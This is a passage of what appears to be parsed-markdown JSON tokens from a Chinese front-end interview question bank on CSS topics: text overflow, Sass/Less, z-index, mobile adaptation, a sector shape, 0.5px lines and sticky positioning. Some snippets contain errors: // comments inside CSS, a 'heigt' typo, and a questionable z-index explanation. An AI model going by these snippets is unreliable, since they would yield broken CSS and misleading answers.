类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- 单行文本溢出","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 单行文本溢出","task":false,"loose":false,"text":"单行文本溢出","tokens":[{"type":"text","raw":"单行文本溢出","text":"单行文本溢出","tokens":[{"type":"text","raw":"单行文本溢出","text":"单行文本溢出","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\noverflow: hidden;            // 溢出隐藏\\ntext-overflow: ellipsis;      // 溢出用省略号显示\\nwhite-space: nowrap;         // 规定段落中的文本不进行换行\\n```","lang":"css","text":"overflow: hidden;            // 溢出隐藏\\ntext-overflow: ellipsis;      // 溢出用省略号显示\\nwhite-space: nowrap;         // 规定段落中的文本不进行换行"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 多行文本溢出","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 多行文本溢出","task":false,"loose":false,"text":"多行文本溢出","tokens":[{"type":"text","raw":"多行文本溢出","text":"多行文本溢出","tokens":[{"type":"text","raw":"多行文本溢出","text":"多行文本溢出","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\ndisplay: -webkit-box;         // 作为弹性伸缩盒子模型显示\\n-webkit-box-orient: vertical; // 设置伸缩盒子的子元素排列方式--从上到下垂直排列\\n-webkit-line-clamp: 3;        // 显示的行数\\noverflow: hidden;             // 溢出隐藏\\n```","lang":"css","text":"display: -webkit-box;         // 作为弹性伸缩盒子模型显示\\n-webkit-box-orient: vertical; // 设置伸缩盒子的子元素排列方式--从上到下垂直排列\\n-webkit-line-clamp: 3;        // 显示的行数\\noverflow: hidden;             // 溢出隐藏"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Sass、Less 是什么？为什么要使用他们？\\n\\n","depth":2,"text":"Sass、Less 是什么？为什么要使用他们？","tokens":[{"type":"text","raw":"Sass、Less 是什么？为什么要使用他们？","text":"Sass、Less 是什么？为什么要使用他们？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- 他们都是 CSS 预处理器，是 CSS 上的一种抽象层。他们是一种特殊的语法/语言编译成 CSS。 例如 Less 是一种动态样式语言，将 CSS 赋予了动态语言的特性，如变量，继承，运算， 函数，LESS 既可以在客户端上运行 (支持 IE 6+, Webkit, Firefox)，也可以在服务端运行 (借助 Node.js)。\\n\\n- 为什么要使用它们？\\n\\n- 结构清晰，便于扩展。 可以方便地屏蔽浏览器私有语法差异。封装对浏览器语法差异的重复处理， 减少无意义的机械劳动。\\n\\n- 可以轻松实现多重继承。 完全兼容 CSS 代码，可以方便地应用到老项目中。 减少代码量，提高开发效率。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 他们都是 CSS 预处理器，是 CSS 上的一种抽象层。他们是一种特殊的语法/语言编译成 CSS。 例如 Less 是一种动态样式语言，将 CSS 赋予了动态语言的特性，如变量，继承，运算， 函数，LESS 既可以在客户端上运行 (支持 IE 6+, Webkit, Firefox)，也可以在服务端运行 (借助 Node.js)。\\n\\n","task":false,"loose":true,"text":"他们都是 CSS 预处理器，是 CSS 上的一种抽象层。他们是一种特殊的语法/语言编译成 CSS。 例如 Less 是一种动态样式语言，将 CSS 赋予了动态语言的特性，如变量，继承，运算， 函数，LESS 既可以在客户端上运行 (支持 IE 6+, Webkit, Firefox)，也可以在服务端运行 (借助 Node.js)。\\n","tokens":[{"type":"text","raw":"他们都是 CSS 预处理器，是 CSS 上的一种抽象层。他们是一种特殊的语法/语言编译成 CSS。 例如 Less 是一种动态样式语言，将 CSS 赋予了动态语言的特性，如变量，继承，运算， 函数，LESS 既可以在客户端上运行 (支持 IE 6+, Webkit, Firefox)，也可以在服务端运行 (借助 Node.js)。\\n","text":"他们都是 CSS 预处理器，是 CSS 上的一种抽象层。他们是一种特殊的语法/语言编译成 CSS。 例如 Less 是一种动态样式语言，将 CSS 赋予了动态语言的特性，如变量，继承，运算， 函数，LESS 既可以在客户端上运行 (支持 IE 6+, Webkit, Firefox)，也可以在服务端运行 (借助 Node.js)。","tokens":[{"type":"text","raw":"他们都是 CSS 预处理器，是 CSS 上的一种抽象层。他们是一种特殊的语法/语言编译成 CSS。 例如 Less 是一种动态样式语言，将 CSS 赋予了动态语言的特性，如变量，继承，运算， 函数，LESS 既可以在客户端上运行 (支持 IE 6+, Webkit, Firefox)，也可以在服务端运行 (借助 Node.js)。","text":"他们都是 CSS 预处理器，是 CSS 上的一种抽象层。他们是一种特殊的语法/语言编译成 CSS。 例如 Less 是一种动态样式语言，将 CSS 赋予了动态语言的特性，如变量，继承，运算， 函数，LESS 既可以在客户端上运行 (支持 IE 6+, Webkit, Firefox)，也可以在服务端运行 (借助 Node.js)。","escaped":false}]}]},{"type":"list_item","raw":"- 为什么要使用它们？\\n\\n","task":false,"loose":true,"text":"为什么要使用它们？\\n","tokens":[{"type":"text","raw":"为什么要使用它们？\\n","text":"为什么要使用它们？","tokens":[{"type":"text","raw":"为什么要使用它们？","text":"为什么要使用它们？","escaped":false}]}]},{"type":"list_item","raw":"- 结构清晰，便于扩展。 可以方便地屏蔽浏览器私有语法差异。封装对浏览器语法差异的重复处理， 减少无意义的机械劳动。\\n\\n","task":false,"loose":true,"text":"结构清晰，便于扩展。 可以方便地屏蔽浏览器私有语法差异。封装对浏览器语法差异的重复处理， 减少无意义的机械劳动。\\n","tokens":[{"type":"text","raw":"结构清晰，便于扩展。 可以方便地屏蔽浏览器私有语法差异。封装对浏览器语法差异的重复处理， 减少无意义的机械劳动。\\n","text":"结构清晰，便于扩展。 可以方便地屏蔽浏览器私有语法差异。封装对浏览器语法差异的重复处理， 减少无意义的机械劳动。","tokens":[{"type":"text","raw":"结构清晰，便于扩展。 可以方便地屏蔽浏览器私有语法差异。封装对浏览器语法差异的重复处理， 减少无意义的机械劳动。","text":"结构清晰，便于扩展。 可以方便地屏蔽浏览器私有语法差异。封装对浏览器语法差异的重复处理， 减少无意义的机械劳动。","escaped":false}]}]},{"type":"list_item","raw":"- 可以轻松实现多重继承。 完全兼容 CSS 代码，可以方便地应用到老项目中。 减少代码量，提高开发效率。","task":false,"loose":true,"text":"可以轻松实现多重继承。 完全兼容 CSS 代码，可以方便地应用到老项目中。 减少代码量，提高开发效率。","tokens":[{"type":"text","raw":"可以轻松实现多重继承。 完全兼容 CSS 代码，可以方便地应用到老项目中。 减少代码量，提高开发效率。","text":"可以轻松实现多重继承。 完全兼容 CSS 代码，可以方便地应用到老项目中。 减少代码量，提高开发效率。","tokens":[{"type":"text","raw":"可以轻松实现多重继承。 完全兼容 CSS 代码，可以方便地应用到老项目中。 减少代码量，提高开发效率。","text":"可以轻松实现多重继承。 完全兼容 CSS 代码，可以方便地应用到老项目中。 减少代码量，提高开发效率。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## z-index属性在什么情况下会失效?\\n\\n","depth":2,"text":"z-index属性在什么情况下会失效?","tokens":[{"type":"text","raw":"z-index属性在什么情况下会失效?","text":"z-index属性在什么情况下会失效?","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 通常 z-index 的使用是在有两个重叠的标签，在一定的情况下控制其中一个在另一个的上方或者下方出现。z-index值越大就越是在上层。z-index元素的position属性需要是relative，absolute或是fixed。\\n\\n- 父元素position为relative时，子元素的z-index失效。解决：父元素position改为absolute或static；\\n\\n- 元素没有设置position属性为非static属性。解决：设置该元素的position属性为relative，absolute或是fixed中的一种；\\n\\n- 元素在设置z-index的同时还设置了float浮动。解决：float去除，改为display：inline-block；","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 通常 z-index 的使用是在有两个重叠的标签，在一定的情况下控制其中一个在另一个的上方或者下方出现。z-index值越大就越是在上层。z-index元素的position属性需要是relative，absolute或是fixed。\\n\\n","task":false,"loose":true,"text":"通常 z-index 的使用是在有两个重叠的标签，在一定的情况下控制其中一个在另一个的上方或者下方出现。z-index值越大就越是在上层。z-index元素的position属性需要是relative，absolute或是fixed。\\n","tokens":[{"type":"text","raw":"通常 z-index 的使用是在有两个重叠的标签，在一定的情况下控制其中一个在另一个的上方或者下方出现。z-index值越大就越是在上层。z-index元素的position属性需要是relative，absolute或是fixed。\\n","text":"通常 z-index 的使用是在有两个重叠的标签，在一定的情况下控制其中一个在另一个的上方或者下方出现。z-index值越大就越是在上层。z-index元素的position属性需要是relative，absolute或是fixed。","tokens":[{"type":"text","raw":"通常 z-index 的使用是在有两个重叠的标签，在一定的情况下控制其中一个在另一个的上方或者下方出现。z-index值越大就越是在上层。z-index元素的position属性需要是relative，absolute或是fixed。","text":"通常 z-index 的使用是在有两个重叠的标签，在一定的情况下控制其中一个在另一个的上方或者下方出现。z-index值越大就越是在上层。z-index元素的position属性需要是relative，absolute或是fixed。","escaped":false}]}]},{"type":"list_item","raw":"- 父元素position为relative时，子元素的z-index失效。解决：父元素position改为absolute或static；\\n\\n","task":false,"loose":true,"text":"父元素position为relative时，子元素的z-index失效。解决：父元素position改为absolute或static；\\n","tokens":[{"type":"text","raw":"父元素position为relative时，子元素的z-index失效。解决：父元素position改为absolute或static；\\n","text":"父元素position为relative时，子元素的z-index失效。解决：父元素position改为absolute或static；","tokens":[{"type":"text","raw":"父元素position为relative时，子元素的z-index失效。解决：父元素position改为absolute或static；","text":"父元素position为relative时，子元素的z-index失效。解决：父元素position改为absolute或static；","escaped":false}]}]},{"type":"list_item","raw":"- 元素没有设置position属性为非static属性。解决：设置该元素的position属性为relative，absolute或是fixed中的一种；\\n\\n","task":false,"loose":true,"text":"元素没有设置position属性为非static属性。解决：设置该元素的position属性为relative，absolute或是fixed中的一种；\\n","tokens":[{"type":"text","raw":"元素没有设置position属性为非static属性。解决：设置该元素的position属性为relative，absolute或是fixed中的一种；\\n","text":"元素没有设置position属性为非static属性。解决：设置该元素的position属性为relative，absolute或是fixed中的一种；","tokens":[{"type":"text","raw":"元素没有设置position属性为非static属性。解决：设置该元素的position属性为relative，absolute或是fixed中的一种；","text":"元素没有设置position属性为非static属性。解决：设置该元素的position属性为relative，absolute或是fixed中的一种；","escaped":false}]}]},{"type":"list_item","raw":"- 元素在设置z-index的同时还设置了float浮动。解决：float去除，改为display：inline-block；","task":false,"loose":true,"text":"元素在设置z-index的同时还设置了float浮动。解决：float去除，改为display：inline-block；","tokens":[{"type":"text","raw":"元素在设置z-index的同时还设置了float浮动。解决：float去除，改为display：inline-block；","text":"元素在设置z-index的同时还设置了float浮动。解决：float去除，改为display：inline-block；","tokens":[{"type":"text","raw":"元素在设置z-index的同时还设置了float浮动。解决：float去除，改为display：inline-block；","text":"元素在设置z-index的同时还设置了float浮动。解决：float去除，改为display：inline-block；","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何根据设计稿进行移动端适配？\\n\\n","depth":2,"text":"如何根据设计稿进行移动端适配？","tokens":[{"type":"text","raw":"如何根据设计稿进行移动端适配？","text":"如何根据设计稿进行移动端适配？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 移动端适配主要有两个维度：\\n\\n- 适配不同像素密度， 针对不同的像素密度，使用 CSS 媒体查询，选择不同精度的图片，以保证图片不会失真；\\n\\n- 适配不同屏幕大小， 由于不同的屏幕有着不同的逻辑像素大小，所以如果直接使用 px 作为开发单位，会使得开发的页面在某一款手机上可以准确显示，但是在另一款手机上就会失真。为了适配不同屏幕的大小，应按照比例来还原设计稿的内容。\\n\\n- 为了能让页面的尺寸自适应，可以使用 rem，em，vw，vh 等相对单位。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 移动端适配主要有两个维度：\\n\\n","task":false,"loose":true,"text":"移动端适配主要有两个维度：\\n","tokens":[{"type":"text","raw":"移动端适配主要有两个维度：\\n","text":"移动端适配主要有两个维度：","tokens":[{"type":"text","raw":"移动端适配主要有两个维度：","text":"移动端适配主要有两个维度：","escaped":false}]}]},{"type":"list_item","raw":"- 适配不同像素密度， 针对不同的像素密度，使用 CSS 媒体查询，选择不同精度的图片，以保证图片不会失真；\\n\\n","task":false,"loose":true,"text":"适配不同像素密度， 针对不同的像素密度，使用 CSS 媒体查询，选择不同精度的图片，以保证图片不会失真；\\n","tokens":[{"type":"text","raw":"适配不同像素密度， 针对不同的像素密度，使用 CSS 媒体查询，选择不同精度的图片，以保证图片不会失真；\\n","text":"适配不同像素密度， 针对不同的像素密度，使用 CSS 媒体查询，选择不同精度的图片，以保证图片不会失真；","tokens":[{"type":"text","raw":"适配不同像素密度， 针对不同的像素密度，使用 CSS 媒体查询，选择不同精度的图片，以保证图片不会失真；","text":"适配不同像素密度， 针对不同的像素密度，使用 CSS 媒体查询，选择不同精度的图片，以保证图片不会失真；","escaped":false}]}]},{"type":"list_item","raw":"- 适配不同屏幕大小， 由于不同的屏幕有着不同的逻辑像素大小，所以如果直接使用 px 作为开发单位，会使得开发的页面在某一款手机上可以准确显示，但是在另一款手机上就会失真。为了适配不同屏幕的大小，应按照比例来还原设计稿的内容。\\n\\n","task":false,"loose":true,"text":"适配不同屏幕大小， 由于不同的屏幕有着不同的逻辑像素大小，所以如果直接使用 px 作为开发单位，会使得开发的页面在某一款手机上可以准确显示，但是在另一款手机上就会失真。为了适配不同屏幕的大小，应按照比例来还原设计稿的内容。\\n","tokens":[{"type":"text","raw":"适配不同屏幕大小， 由于不同的屏幕有着不同的逻辑像素大小，所以如果直接使用 px 作为开发单位，会使得开发的页面在某一款手机上可以准确显示，但是在另一款手机上就会失真。为了适配不同屏幕的大小，应按照比例来还原设计稿的内容。\\n","text":"适配不同屏幕大小， 由于不同的屏幕有着不同的逻辑像素大小，所以如果直接使用 px 作为开发单位，会使得开发的页面在某一款手机上可以准确显示，但是在另一款手机上就会失真。为了适配不同屏幕的大小，应按照比例来还原设计稿的内容。","tokens":[{"type":"text","raw":"适配不同屏幕大小， 由于不同的屏幕有着不同的逻辑像素大小，所以如果直接使用 px 作为开发单位，会使得开发的页面在某一款手机上可以准确显示，但是在另一款手机上就会失真。为了适配不同屏幕的大小，应按照比例来还原设计稿的内容。","text":"适配不同屏幕大小， 由于不同的屏幕有着不同的逻辑像素大小，所以如果直接使用 px 作为开发单位，会使得开发的页面在某一款手机上可以准确显示，但是在另一款手机上就会失真。为了适配不同屏幕的大小，应按照比例来还原设计稿的内容。","escaped":false}]}]},{"type":"list_item","raw":"- 为了能让页面的尺寸自适应，可以使用 rem，em，vw，vh 等相对单位。","task":false,"loose":true,"text":"为了能让页面的尺寸自适应，可以使用 rem，em，vw，vh 等相对单位。","tokens":[{"type":"text","raw":"为了能让页面的尺寸自适应，可以使用 rem，em，vw，vh 等相对单位。","text":"为了能让页面的尺寸自适应，可以使用 rem，em，vw，vh 等相对单位。","tokens":[{"type":"text","raw":"为了能让页面的尺寸自适应，可以使用 rem，em，vw，vh 等相对单位。","text":"为了能让页面的尺寸自适应，可以使用 rem，em，vw，vh 等相对单位。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 实现一个扇形\\n\\n","depth":2,"text":"实现一个扇形","tokens":[{"type":"text","raw":"实现一个扇形","text":"实现一个扇形","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 用CSS实现扇形的思路和三角形基本一致，就是多了一个圆角的样式，实现一个90°的扇形：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 用CSS实现扇形的思路和三角形基本一致，就是多了一个圆角的样式，实现一个90°的扇形：","task":false,"loose":false,"text":"用CSS实现扇形的思路和三角形基本一致，就是多了一个圆角的样式，实现一个90°的扇形：","tokens":[{"type":"text","raw":"用CSS实现扇形的思路和三角形基本一致，就是多了一个圆角的样式，实现一个90°的扇形：","text":"用CSS实现扇形的思路和三角形基本一致，就是多了一个圆角的样式，实现一个90°的扇形：","tokens":[{"type":"text","raw":"用CSS实现扇形的思路和三角形基本一致，就是多了一个圆角的样式，实现一个90°的扇形：","text":"用CSS实现扇形的思路和三角形基本一致，就是多了一个圆角的样式，实现一个90°的扇形：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\ndiv{\\n    border: 100px solid transparent;\\n    width: 0;\\n    heigt: 0;\\n    border-radius: 100px;\\n    border-top-color: red;\\n}\\n```","lang":"css","text":"div{\\n    border: 100px solid transparent;\\n    width: 0;\\n    heigt: 0;\\n    border-radius: 100px;\\n    border-top-color: red;\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 画一条0.5px的线\\n\\n","depth":2,"text":"画一条0.5px的线","tokens":[{"type":"text","raw":"画一条0.5px的线","text":"画一条0.5px的线","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 采用transform: scale()的方式，该方法用来定义元素的2D 缩放转换：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 采用transform: scale()的方式，该方法用来定义元素的2D 缩放转换：","task":false,"loose":false,"text":"采用transform: scale()的方式，该方法用来定义元素的2D 缩放转换：","tokens":[{"type":"text","raw":"采用transform: scale()的方式，该方法用来定义元素的2D 缩放转换：","text":"采用transform: scale()的方式，该方法用来定义元素的2D 缩放转换：","tokens":[{"type":"text","raw":"采用transform: scale()的方式，该方法用来定义元素的2D 缩放转换：","text":"采用transform: scale()的方式，该方法用来定义元素的2D 缩放转换：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\ntransform: scale(0.5,0.5);\\n```","lang":"css","text":"transform: scale(0.5,0.5);"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 采用meta viewport的方式","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 采用meta viewport的方式","task":false,"loose":false,"text":"采用meta viewport的方式","tokens":[{"type":"text","raw":"采用meta viewport的方式","text":"采用meta viewport的方式","tokens":[{"type":"text","raw":"采用meta viewport的方式","text":"采用meta viewport的方式","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```html\\n<meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=0.5, minimum-scale=0.5, maximum-scale=0.5\\"/>\\n```","lang":"html","text":"<meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=0.5, minimum-scale=0.5, maximum-scale=0.5\\"/>"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 对 sticky 定位的理解\\n\\n","depth":2,"text":"对 sticky 定位的理解","tokens":[{"type":"text","raw":"对 sticky 定位的理解","text":"对 sticky 定位的理解","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- sticky 英文字面意思是粘贴，所以可以把它称之为粘性定位。语法：position: sticky; 基于用户的滚动位置来定位。\\n\\n- 粘性定位的元素是依赖于用户的滚动，在 position:relative 与 position:fixed 定位之间切换。它的行为就像 position:relative; 而当页面滚动超出目标区域时，它的表现就像 position:fixed;，它会固定在目标位置。元素定位表现为在跨越特定阈值前为相对定位，之后为固定定位。这个特定阈值指的是 top, right, bottom 或 left\\n之一，换言之，指定 top, right, bottom 或 left 四个阈值其中之一，才可使粘性定位生效。否则其行为与相对定位相同。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- sticky 英文字面意思是粘贴，所以可以把它称之为粘性定位。语法：position: sticky; 基于用户的滚动位置来定位。\\n\\n","task":false,"loose":true,"text":"sticky 英文字面意思是粘贴，所以可以把它称之为粘性定位。语法：position: sticky; 基于用户的滚动位置来定位。\\n","tokens":[{"type":"text","raw":"sticky 英文字面意思是粘贴，所以可以把它称之为粘性定位。语法：position: sticky; 基于用户的滚动位置来定位。\\n","text":"sticky 英文字面意思是粘贴，所以可以把它称之为粘性定位。语法：position: sticky; 基于用户的滚动位置来定位。","tokens":[{"type":"text","raw":"sticky 英文字面意思是粘贴，所以可以把它称之为粘性定位。语法：position: sticky; 基于用户的滚动位置来定位。","text":"sticky 英文字面意思是粘贴，所以可以把它称之为粘性定位。语法：position: sticky; 基于用户的滚动位置来定位。","escaped":false}]}]},{"type":"list_item","raw":"- 粘性定位的元素是依赖于用户的滚动，在 position:relative 与 position:fixed 定位之间切换。它的行为就像 position:relative; 而当页面滚动超出目标区域时，它的表现就像 position:fixed;，它会固定在目标位置。元素定位表现为在跨越特定阈值前为相对定位，之后为固定定位。这个特定阈值指的是 top, right, bottom 或 left\\n之一，换言之，指定 top, right, bottom 或 left 四个阈值其中之一，才可使粘性定位生效。否则其行为与相对定位相同。","task":false,"loose":true,"text":"粘性定位的元素是依赖于用户的滚动，在 position:relative 与 position:fixed 定位之间切换。它的行为就像 position:relative; 而当页面滚动超出目标区域时，它的表现就像 position:fixed;，它会固定在目标位置。元素定位表现为在跨越特定阈值前为相对定位，之后为固定定位。这个特定阈值指的是 top, right, bottom 或 left\\n之一，换言之，指定 top, right, bottom 或 left 四个阈值其中之一，才可使粘性定位生效。否则其行为与相对定位相同。","tokens":[{"type":"text","raw":"粘性定位的元素是依赖于用户的滚动，在 position:relative 与 position:fixed 定位之间切换。它的行为就像 position:relative; 而当页面滚动超出目标区域时，它的表现就像 position:fixed;，它会固定在目标位置。元素定位表现为在跨越特定阈值前为相对定位，之后为固定定位。这个特定阈值指的是 top, right, bottom 或 left\\n\\n之一，换言之，指定 top, right, bottom 或 left 四个阈值其中之一，才可使粘性定位生效。否则其行为与相对定位相同。","text":"粘性定位的元素是依赖于用户的滚动，在 position:relative 与 position:fixed 定位之间切换。它的行为就像 position:relative; 而当页面滚动超出目标区域时，它的表现就像 position:fixed;，它会固定在目标位置。元素定位表现为在跨越特定阈值前为相对定位，之后为固定定位。这个特定阈值指的是 top, right, bottom 或 